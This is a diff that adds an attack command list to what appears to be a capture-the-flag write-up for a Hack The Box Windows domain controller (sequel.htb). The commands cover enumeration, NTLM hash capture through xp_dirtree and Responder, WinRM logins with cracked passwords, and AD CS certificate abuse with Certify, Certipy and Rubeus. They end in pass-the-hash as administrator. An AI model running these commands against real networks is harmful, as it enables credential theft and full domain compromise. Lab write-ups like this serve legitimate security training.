@@ -1,5 +1,43 @@
 ```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.202
+smbclient -L \\\\10.10.11.202\\
+smbclient \\\\10.10.11.202\\Public
+python3 -m http.server 80
+http://10.10.14.6/SQL%20Server%20Procedures.pdf
+./kerbrute_linux_amd64 userenum --dc 10.10.11.202 -d sequel.htb users_0
+impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
+responder -I tun0 -v
+EXEC MASTER.sys.xp_dirtree '\\10.10.14.6\test', 1, 1
+crackmapexec winrm 10.10.11.202 -u users_3 -p REGGIE1234ronnie --continue-on-success
+evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
+upload winPEASany.exe
+./winPEASany.exe
+type C:\sqlserver\Logs\ERRORLOG.bak
+crackmapexec winrm 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
+evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
+Download Certify.exe https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any
+upload Certify.exe
+.\Certify.exe find /vulnerable /currentuser
+.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+upload cert.pfx
+.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx
+.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
+evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
+git clone https://github.com/ly4k/Certipy.git
+python3 setup.py install
+certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target 10.10.11.202 -template UserAuthentication -upn Administrator@sequel.htb -dns dc.sequel.htb -debug
+certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
+sudo service virtualbox-guest-utils stop
+sudo ntpdate -s 10.10.11.202
+certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
+evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
+```
+
+
+
+```
+nmap -sS -sC -sV -T5 -Pn 10.10.11.202
 dc.sequel.htb
 ```
 ![image](https://github.com/user-attachments/assets/9263ebf5-8f7b-407d-baa3-e3a46e8540af)
